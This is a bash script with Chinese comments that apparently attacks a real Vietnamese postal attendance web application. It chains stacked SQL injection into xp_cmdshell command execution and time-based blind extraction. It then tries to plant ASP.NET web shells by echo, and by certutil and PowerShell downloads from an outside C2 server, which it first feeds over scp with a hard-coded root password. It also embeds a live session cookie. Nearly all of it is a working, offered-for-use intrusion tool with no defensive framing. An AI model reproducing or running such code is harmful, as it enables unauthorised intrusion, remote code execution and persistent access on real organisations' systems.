#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 SQL注入 → RCE → GetShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

get_viewstate() {
    local id=$1
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段1] 启用xp_cmdshell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

ENABLE_XP_CMDSHELL="11'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"

echo "  执行启用命令..."
get_viewstate "BC01"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=${ENABLE_XP_CMDSHELL}" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o enable_xp.html 2>&1

if grep -qi "permission\|denied\|error" enable_xp.html; then
    echo "  ⚠️  可能权限不足（继续尝试）"
else
    echo "  ✅ 命令已执行"
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段2] 测试命令执行"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TEST_CMDS=(
    "whoami"
    "hostname"
    "ipconfig"
    "net user"
)

for cmd in "${TEST_CMDS[@]}"; do
    echo ""
    echo "  测试命令: $cmd"
    
    # 使用时间盲注判断命令执行成功
    # 如果命令成功，延迟5秒
    PAYLOAD="11'; DECLARE @output VARCHAR(8000); EXEC xp_cmdshell '${cmd}', @output OUTPUT; IF @output IS NOT NULL WAITFOR DELAY '00:00:05';--"
    
    get_viewstate "BC01"
    
    start=$(date +%s%N)
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${PAYLOAD}" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "cmd_${cmd}.html" 2>&1
    end=$(date +%s%N)
    
    elapsed=$(( (end - start) / 1000000 ))
    
    echo "    耗时: ${elapsed}ms"
    
    if [ $elapsed -gt 4000 ]; then
        echo "    🔥🔥🔥 命令执行成功！"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段3] 通过时间盲注提取命令输出"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  提取whoami输出..."

# 使用二分法逐字符提取
extract_output() {
    local cmd=$1
    local output=""
    
    for pos in {1..50}; do
        # 测试每个字符
        for ascii in {32..126}; do
            char=$(printf "\\x$(printf %x $ascii)")
            
            PAYLOAD="11'; DECLARE @out VARCHAR(8000); EXEC @out = xp_cmdshell '${cmd}'; IF SUBSTRING(@out,${pos},1)=CHAR(${ascii}) WAITFOR DELAY '00:00:02';--"
            
            get_viewstate "BC01"
            
            start=$(date +%s%N)
            curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
                -X POST \
                -H "Cookie: $COOKIE" \
                --data-urlencode "__VIEWSTATE=$VS" \
                --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
                --data-urlencode "__EVENTVALIDATION=$EV" \
                --data-urlencode "txtThang=${PAYLOAD}" \
                --data-urlencode "txtNam=2025" \
                --data-urlencode "btnExport=Export" \
                -o /dev/null 2>&1
            end=$(date +%s%N)
            
            elapsed=$(( (end - start) / 1000000 ))
            
            if [ $elapsed -gt 1500 ]; then
                output="${output}${char}"
                echo -n "$char"
                break
            fi
        done
        
        # 如果没找到字符，说明到末尾了
        if [ ${#output} -eq $((pos - 1)) ]; then
            break
        fi
    done
    
    echo ""
    echo "  结果: $output"
}

# extract_output "whoami"  # 太慢，先跳过

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[阶段4] 写入WebShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

WEBSHELL_CONTENT='<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]).WaitForExit();%>'

echo "  WebShell路径: C:\\inetpub\\wwwroot\\chamcong\\x.aspx"
echo ""

# 方法1: 直接写入
WRITE_CMD="echo ${WEBSHELL_CONTENT} > C:\\inetpub\\wwwroot\\chamcong\\x.aspx"
PAYLOAD1="11'; EXEC xp_cmdshell '${WRITE_CMD}';--"

echo "  [方法1] 通过xp_cmdshell echo写入..."
get_viewstate "BC01"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=${PAYLOAD1}" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o write_shell1.html 2>&1

echo "  测试WebShell..."
shell_resp=$(curl -sk "http://vps.vnpost.vn/chamcong/x.aspx?c=whoami" 2>&1)
if echo "$shell_resp" | grep -qiE "nt authority|iis|network"; then
    echo "  🔥🔥🔥🔥🔥 WebShell成功！"
    echo "  URL: http://vps.vnpost.vn/chamcong/x.aspx?c=whoami"
    echo "$shell_resp"
    echo "SUCCESS" > GETSHELL_SUCCESS.txt
else
    echo "  ❌ 方法1失败"
fi

# 方法2: 使用certutil下载
echo ""
echo "  [方法2] 通过certutil下载..."

# 先在C2服务器创建WebShell
echo '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]).StandardOutput.ReadToEnd());%>' > /tmp/shell.aspx

# 上传到C2
sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no \
    /tmp/shell.aspx root@82.29.71.156:/var/www/html/s.txt 2>&1 | grep -v "Warning"

DOWNLOAD_CMD="certutil -urlcache -split -f http://82.29.71.156/s.txt C:\\inetpub\\wwwroot\\chamcong\\y.aspx"
PAYLOAD2="11'; EXEC xp_cmdshell '${DOWNLOAD_CMD}';--"

get_viewstate "BC01"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=${PAYLOAD2}" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o write_shell2.html 2>&1

sleep 2

echo "  测试WebShell..."
shell_resp=$(curl -sk "http://vps.vnpost.vn/chamcong/y.aspx?c=whoami" 2>&1)
if echo "$shell_resp" | grep -qiE "nt authority|iis|network|vnpost"; then
    echo "  🔥🔥🔥🔥🔥 WebShell成功！"
    echo "  URL: http://vps.vnpost.vn/chamcong/y.aspx?c=whoami"
    echo "$shell_resp"
    echo "SUCCESS" > GETSHELL_SUCCESS.txt
else
    echo "  ❌ 方法2失败"
fi

# 方法3: PowerShell下载
echo ""
echo "  [方法3] 通过PowerShell下载..."

POWERSHELL_CMD="powershell -c (New-Object Net.WebClient).DownloadFile('http://82.29.71.156/s.txt','C:\\inetpub\\wwwroot\\chamcong\\z.aspx')"
PAYLOAD3="11'; EXEC xp_cmdshell '${POWERSHELL_CMD}';--"

get_viewstate "BC01"

curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtThang=${PAYLOAD3}" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o write_shell3.html 2>&1

sleep 2

echo "  测试WebShell..."
shell_resp=$(curl -sk "http://vps.vnpost.vn/chamcong/z.aspx?c=whoami" 2>&1)
if echo "$shell_resp" | grep -qiE "nt authority|iis|network|vnpost"; then
    echo "  🔥🔥🔥🔥🔥 WebShell成功！"
    echo "  URL: http://vps.vnpost.vn/chamcong/z.aspx?c=whoami"
    echo "$shell_resp"
    echo "SUCCESS" > GETSHELL_SUCCESS.txt
else
    echo "  ❌ 方法3失败"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ SQL注入利用完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "GETSHELL_SUCCESS.txt" ]; then
    echo ""
    echo "🔥🔥🔥🔥🔥 GetShell成功！"
    echo ""
    echo "WebShell URL:"
    echo "  - http://vps.vnpost.vn/chamcong/x.aspx?c=whoami"
    echo "  - http://vps.vnpost.vn/chamcong/y.aspx?c=whoami"
    echo "  - http://vps.vnpost.vn/chamcong/z.aspx?c=whoami"
else
    echo ""
    echo "⚠️  WebShell未成功，但SQL注入可用于："
    echo "  1. 时间盲注提取数据"
    echo "  2. 堆叠查询执行SQL"
    echo "  3. 继续尝试RCE"
fi
